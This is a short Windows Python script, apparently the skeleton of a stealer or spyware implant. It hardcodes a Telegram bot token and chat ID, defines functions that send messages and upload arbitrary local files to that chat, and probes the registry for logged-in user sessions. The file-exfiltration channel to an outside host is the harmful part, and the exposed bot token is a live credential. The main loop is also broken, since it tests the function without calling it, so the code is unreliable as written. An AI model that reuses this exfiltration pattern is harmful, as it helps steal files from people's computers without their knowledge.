#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string
import time
import sys
import winreg

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_user_logged_in():
    key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\SessionData'

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        i = 0
        while True:
            try:
                session_key_name = winreg.EnumKey(key, i)
                session_key_path = key_path + '\\' + session_key_name
                session_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, session_key_path)

                status, _ = winreg.QueryValueEx(session_key, 'Status')
                if status == 1:
                    winreg.CloseKey(session_key)
                    winreg.CloseKey(key)
                    print("A user is currently logged in.")
                    return True

                winreg.CloseKey(session_key)
                i += 1
            except OSError:
                break

        winreg.CloseKey(key)
    except OSError:
        pass

    print("No user is currently logged in.")
    return False

while True:
    if is_user_logged_in:
        os.system("msg * userloged")
        break
    else:
        os.system("msg * usernotlogged")